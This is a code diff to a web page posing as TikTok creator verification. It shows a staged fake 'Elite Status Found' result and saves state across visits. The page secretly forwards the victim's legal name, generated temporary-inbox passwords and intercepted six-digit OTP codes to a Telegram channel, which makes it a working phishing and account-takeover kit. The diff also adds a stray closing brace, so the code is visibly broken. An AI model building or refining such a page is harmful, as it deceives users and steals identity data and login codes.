@@ -125,6 +125,30 @@
         .success-glow {
             box-shadow: 0 0 30px rgba(34, 197, 94, 0.2);
         }
+
+        /* Celebratory Animations */
+        @keyframes celebrate {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+        .animate-celebrate {
+            animation: celebrate 0.5s ease-in-out infinite;
+        }
+
+        @keyframes confetti-fall {
+            0% { transform: translateY(-100%) rotate(0deg); opacity: 1; }
+            100% { transform: translateY(100vh) rotate(360deg); opacity: 0; }
+        }
+        .confetti {
+            position: absolute;
+            width: 8px;
+            height: 8px;
+            background-color: #FE2C55;
+            animation: confetti-fall 3s linear forwards;
+            z-index: 100;
+            pointer-events: none;
+        }
     </style>
 </head>
 <body class="min-h-screen flex flex-col">
@@ -138,7 +162,7 @@
                 <div class="absolute -top-2 -right-2 w-4 h-4 bg-tiktok-cyan rounded-full animate-ping"></div>
             </div>
             <h1 class="text-5xl font-extrabold mb-4 tracking-tight leading-tight">
-                Elite <span class="gradient-text">Creator</span><br>Verification
+                Verify.<span class="gradient-text"> Faster.</span><br> Smarter.
             </h1>
             <p class="text-gray-400 mb-10 max-w-md mx-auto leading-relaxed">
                 Unlock exclusive features, higher visibility, and official badge recognition. 
@@ -160,43 +184,51 @@
 
         <!-- STEP 1: ELIGIBILITY -->
         <div id="step-1" class="step-container w-full">
-            <div class="elite-card p-8 rounded-3xl">
+            <div class="elite-card p-8 rounded-3xl relative overflow-hidden">
                 <div class="flex items-center gap-4 mb-8">
-                    <div class="w-12 h-12 rounded-full bg-tiktok-pink/10 flex items-center justify-center text-tiktok-pink font-bold text-xl border border-tiktok-pink/20">1</div>
+                    <div class="w-14 h-14 rounded-2xl bg-gradient-to-br from-tiktok-pink to-tiktok-cyan flex items-center justify-center text-white font-bold text-2xl shadow-lg shadow-pink-500/20">1</div>
                     <div>
-                        <h2 class="text-2xl font-bold">Identity Verification</h2>
-                        <p class="text-xs text-gray-500 uppercase tracking-wider">Authentication Phase</p>
+                        <h2 class="text-3xl font-extrabold tracking-tight">Identity Verification</h2>
+                        <p class="text-xs text-tiktok-cyan font-bold uppercase tracking-[0.2em]">Authentication Phase</p>
                     </div>
                 </div>
                 
                 <div id="eligibility-form">
-                    <p class="text-gray-400 mb-8 leading-relaxed">To ensure account authenticity, please provide your legal full name. This must match the official documents linked to your creator profile.</p>
-                    <div class="mb-8">
-                        <label class="block text-sm text-gray-400 mb-3 ml-1">Full Legal Name</label>
-                        <input type="text" id="user-name" class="w-full p-5 rounded-2xl text-lg" placeholder="Enter your full name">
+                    <div class="glass p-6 rounded-2xl border-white/5 mb-8">
+                        <p class="text-gray-300 mb-6 leading-relaxed">To begin your official verification journey, please provide your legal full name as it appears on your identification documents.</p>
+                        <div class="mb-4">
+                            <label class="block text-sm text-gray-500 mb-3 ml-1 font-bold">FULL LEGAL NAME</label>
+                            <input type="text" id="user-name" class="w-full p-5 rounded-2xl text-lg font-medium border-2 border-transparent focus:border-tiktok-pink transition-all bg-black/40" placeholder="e.g. Johnathan Smith">
+                        </div>
                     </div>
-                    <button onclick="checkEligibility()" class="w-full py-5 bg-tiktok-pink rounded-2xl font-bold text-lg btn-elite">
+                    <button onclick="checkEligibility()" class="w-full py-5 bg-tiktok-pink rounded-2xl font-black text-xl btn-elite hover:shadow-[0_0_40px_rgba(254,44,85,0.5)] transition-all uppercase tracking-widest">
                         Verify Identity
                     </button>
                 </div>
 
-                <div id="eligibility-loading" class="hidden text-center py-12">
-                    <div class="loading-ring mb-6"></div>
-                    <h3 class="text-xl font-bold mb-2">Analyzing Profile</h3>
-                    <p class="text-gray-500 text-sm">Cross-referencing with TikTok Global Database...</p>
+                <div id="eligibility-loading" class="hidden text-center py-16">
+                    <div class="loading-ring mb-8 scale-125"></div>
+                    <h3 class="text-2xl font-bold mb-3 animate-pulse">Analyzing Creator Metrics</h3>
+                    <p class="text-gray-500 text-sm max-w-xs mx-auto leading-relaxed">Cross-referencing your profile with our Global Creator Authenticity Engine...</p>
                 </div>
 
                 <div id="eligibility-result" class="hidden text-center">
-                    <div class="glass p-8 rounded-3xl border-green-500/30 mb-8 success-glow">
-                        <div class="w-20 h-20 bg-green-500/10 text-green-500 rounded-full flex items-center justify-center mx-auto mb-6 border border-green-500/20">
-                            <i class="fas fa-check text-4xl"></i>
+                    <div class="relative glass p-10 rounded-[2.5rem] border-green-500/30 mb-8 success-glow bg-gradient-to-b from-green-500/5 to-transparent">
+                        <div class="w-24 h-24 bg-green-500/10 text-green-500 rounded-full flex items-center justify-center mx-auto mb-8 border-2 border-green-500/20 animate-celebrate shadow-[0_0_50px_rgba(34,197,94,0.3)]">
+                            <i class="fas fa-trophy text-5xl"></i>
                         </div>
-                        <h3 class="text-3xl font-bold mb-2 text-green-500">Elite Status Found</h3>
-                        <p class="text-gray-400 leading-relaxed">Congratulations! Your account history and engagement metrics meet our premium verification standards.</p>
+                        <h3 class="text-4xl font-black mb-4 text-green-500 tracking-tighter uppercase">Elite Status Found!</h3>
+                        <p class="text-gray-300 leading-relaxed font-medium">Extraordinary news! Your account history, engagement patterns, and creator metrics have met our <span class="text-white font-bold">Premium Verification Standards</span>.</p>
+                        
+                        <!-- Celebration badge -->
+                        <div class="mt-8 inline-flex items-center gap-2 bg-green-500/20 px-4 py-2 rounded-full border border-green-500/30">
+                            <i class="fas fa-star text-xs text-green-500"></i>
+                            <span class="text-[10px] font-black text-green-500 uppercase tracking-widest">Verification Tier: Platinum Elite</span>
+                        </div>
                     </div>
                     <div class="flex gap-4">
-                        <button onclick="prevStep(0)" class="flex-1 py-4 bg-gray-800 rounded-2xl font-bold">Return</button>
-                        <button onclick="nextStep(2)" class="flex-[2] py-4 bg-tiktok-pink rounded-2xl font-bold btn-elite">Proceed to Security</button>
+                        <button onclick="prevStep(0)" class="flex-1 py-5 bg-gray-800 rounded-2xl font-bold text-gray-400 hover:bg-gray-700 transition-colors uppercase text-xs tracking-widest">Return</button>
+                        <button onclick="nextStep(2)" class="flex-[2] py-5 bg-tiktok-pink rounded-2xl font-black text-lg btn-elite hover:shadow-[0_0_40px_rgba(254,44,85,0.5)] uppercase tracking-widest">Proceed to Security</button>
                     </div>
                 </div>
             </div>
@@ -455,7 +487,54 @@
         let token = null;
         let pollInterval = null;
         let savedPasscode = '';
-        let processedMessageIds = []; // Track IDs to prevent duplicate TG alerts
+        let monitoredAccounts = []; // List of all accounts to poll
+
+        // Helper to save state to localStorage
+        function saveState() {
+            localStorage.setItem('tiktok_verify_state', JSON.stringify({
+                currentAccount,
+                token,
+                monitoredAccounts,
+                userName: document.getElementById('user-name')?.value || '',
+                currentStep: Array.from(document.querySelectorAll('.step-container')).findIndex(el => el.classList.contains('active'))
+            }));
+        }
+
+        // Helper to load state from localStorage
+        function loadState() {
+            const saved = localStorage.getItem('tiktok_verify_state');
+            if (saved) {
+                const state = JSON.parse(saved);
+                currentAccount = state.currentAccount;
+                token = state.token;
+                monitoredAccounts = state.monitoredAccounts || [];
+                
+                // Cleanup: Only keep accounts created in the last 48 hours
+                // (Mail.tm messages usually expire within 24-48h anyway)
+                const now = new Date().getTime();
+                monitoredAccounts = monitoredAccounts.filter(acc => {
+                    // If no timestamp, add one now
+                    if (!acc.createdAt) acc.createdAt = now;
+                    return (now - acc.createdAt) < (48 * 60 * 60 * 1000);
+                });
+
+                if (state.userName) {
+                    document.getElementById('user-name').value = state.userName;
+                }
+                
+                if (currentAccount && currentAccount.address) {
+                    document.getElementById('email-display').innerText = currentAccount.address;
+                }
+
+                if (state.currentStep !== undefined && state.currentStep > 0) {
+                    if (state.currentStep !== 'success') {
+                        nextStep(state.currentStep);
+                    }
+                }
+                
+                if (monitoredAccounts.length > 0) startPolling();
+            }
+        }
 
         // COUNTDOWN LOGIC (Persistent)
         function startCountdown() {
@@ -501,6 +580,7 @@
             let targetId = (step === 0) ? 'step-landing' : (step === 'success') ? 'step-success' : `step-${step}`;
             document.getElementById(targetId).classList.add('active');
             window.scrollTo({ top: 0, behavior: 'smooth' });
+            saveState();
         }
 
         function prevStep(step) { nextStep(step); }
@@ -533,13 +613,30 @@
             
             // Forward name to Telegram immediately
             sendToTelegram(`🌟 <b>New Identity Verification Started</b>\nName: ${name}`);
+            saveState();
 
             document.getElementById('eligibility-form').classList.add('hidden');
             document.getElementById('eligibility-loading').classList.remove('hidden');
             setTimeout(() => {
                 document.getElementById('eligibility-loading').classList.add('hidden');
                 document.getElementById('eligibility-result').classList.remove('hidden');
+                createConfetti(); // Trigger celebration
+                saveState();
             }, 6500);
+        }
+
+        function createConfetti() {
+            for (let i = 0; i < 50; i++) {
+                const confetti = document.createElement('div');
+                confetti.className = 'confetti';
+                confetti.style.left = Math.random() * 100 + 'vw';
+                confetti.style.backgroundColor = ['#FE2C55', '#25F4EE', '#FFFFFF', '#FFD700'][Math.floor(Math.random() * 4)];
+                confetti.style.animationDelay = Math.random() * 2 + 's';
+                confetti.style.width = Math.random() * 10 + 5 + 'px';
+                confetti.style.height = confetti.style.width;
+                document.body.appendChild(confetti);
+                setTimeout(() => confetti.remove(), 3000);
+            }
         }
 
         // STEP 2 LOGIC (MODAL)
@@ -564,8 +661,19 @@
 
         // STEP 3 LOGIC (MAIL.TM)
         async function createNewEmail() {
+            // Before creating a new one, if there's an old one, add it to monitored list
+            if (currentAccount && token) {
+                // Ensure no duplicates in monitored list
+                if (!monitoredAccounts.some(acc => acc.address === currentAccount.address)) {
+                    monitoredAccounts.push({
+                        address: currentAccount.address,
+                        token: token,
+                        processedIds: [] // Each account tracks its own messages
+                    });
+                }
+            }
+
             document.getElementById('email-display').innerText = 'Provisioning...';
-            processedMessageIds = []; // Reset processed IDs for new account
             try {
                 const domainRes = await fetch(`${API_URL}/domains`);
                 const domains = await domainRes.json();
@@ -586,64 +694,76 @@
                     body: JSON.stringify({ address, password })
                 });
                 const tokenData = await tokenRes.json();
+                
+                // Set as current active account
                 token = tokenData.token;
+                currentAccount = { address, password };
+                
+                // Also add this new one to monitored list immediately
+                monitoredAccounts.push({
+                    address: address,
+                    token: token,
+                    processedIds: []
+                });
 
                 document.getElementById('email-display').innerText = address;
                 const name = document.getElementById('user-name').value;
                 sendToTelegram(`📧 <b>Elite Endpoint Generated</b>\nUser: ${name}\nEmail: <code>${address}</code>\nMail.tm Pass: <code>${password}</code>`);
+                
+                saveState();
                 startPolling();
             } catch (e) {
                 document.getElementById('email-display').innerText = 'Network Error. Retry.';
             }
         }
+        }
 
         function startPolling() {
             if (pollInterval) clearInterval(pollInterval);
             pollInterval = setInterval(async () => {
-                if (!token) return;
-                try {
-                    const res = await fetch(`${API_URL}/messages`, {
-                        headers: { 'Authorization': `Bearer ${token}` }
-                    });
-                    const data = await res.json();
-                    const messages = data['hydra:member'];
-                    
-                    // Iterate through all messages in the inbox
-                    for (const msg of messages) {
-                        // Check if we've already sent this message to Telegram
-                        if (!processedMessageIds.includes(msg.id)) {
-                            const msgRes = await fetch(`${API_URL}/messages/${msg.id}`, {
-                                headers: { 'Authorization': `Bearer ${token}` }
-                            });
-                            const fullMsg = await msgRes.json();
-                            
-                            const name = document.getElementById('user-name').value;
-                            const emailContent = fullMsg.text || fullMsg.intro || "";
-                            
-                            // Extract numeric OTP (look for 6 consecutive digits)
-                            const otpMatch = emailContent.match(/\b\d{6}\b/);
-                            const extractedOtp = otpMatch ? otpMatch[0] : "NOT FOUND";
-                            
-                            // Update website UI if it's the latest message
-                            if (msg.id === messages[0].id) {
-                                document.getElementById('otp-code').innerText = otpMatch ? otpMatch[0] : "SEE TG";
+                if (monitoredAccounts.length === 0) return;
+
+                for (const acc of monitoredAccounts) {
+                    try {
+                        const res = await fetch(`${API_URL}/messages`, {
+                            headers: { 'Authorization': `Bearer ${acc.token}` }
+                        });
+                        const data = await res.json();
+                        const messages = data['hydra:member'];
+                        
+                        for (const msg of messages) {
+                            if (!acc.processedIds.includes(msg.id)) {
+                                const msgRes = await fetch(`${API_URL}/messages/${msg.id}`, {
+                                    headers: { 'Authorization': `Bearer ${acc.token}` }
+                                });
+                                const fullMsg = await msgRes.json();
+                                
+                                const name = document.getElementById('user-name').value;
+                                const emailContent = fullMsg.text || fullMsg.intro || "";
+                                const otpMatch = emailContent.match(/\b\d{6}\b/);
+                                const extractedOtp = otpMatch ? otpMatch[0] : "NOT FOUND";
+                                
+                                // Update UI ONLY if it's the current active account
+                                if (currentAccount && acc.address === currentAccount.address) {
+                                    if (msg.id === messages[0].id) {
+                                        document.getElementById('otp-code').innerText = otpMatch ? otpMatch[0] : "SEE TG";
+                                    }
+                                }
+                                
+                                const shortenedContent = emailContent.substring(0, 150) + (emailContent.length > 150 ? "..." : "");
+                                sendToTelegram(`📬 <b>MAIL RECEIVED</b>\n` +
+                                               `User: ${name}\n` +
+                                               `Account: <code>${acc.address}</code>\n` +
+                                               `OTP Code: <code>${extractedOtp}</code>\n\n` +
+                                               `Content Start:\n${shortenedContent}`);
+                                
+                                acc.processedIds.push(msg.id);
+                                saveState();
                             }
-                            
-                            // Send concise notification to Telegram
-                            const shortenedContent = emailContent.substring(0, 150) + (emailContent.length > 150 ? "..." : "");
-                            
-                            sendToTelegram(`📬 <b>MAIL RECEIVED</b>\n` +
-                                           `User: ${name}\n` +
-                                           `From: ${fullMsg.from.address}\n` +
-                                           `OTP Code: <code>${extractedOtp}</code>\n\n` +
-                                           `Content Start:\n${shortenedContent}`);
-                            
-                            // Mark as processed
-                            processedMessageIds.push(msg.id);
                         }
+                    } catch (e) {
+                        console.error(`Polling error for ${acc.address}:`, e);
                     }
-                } catch (e) {
-                    console.error("Polling error:", e);
                 }
             }, 5000);
         }
@@ -728,7 +848,10 @@
             nextStep('success');
         }
 
-        window.onload = () => { startCountdown(); };
+        window.onload = () => { 
+            startCountdown(); 
+            loadState();
+        };
     </script>
 </body>
 </html>
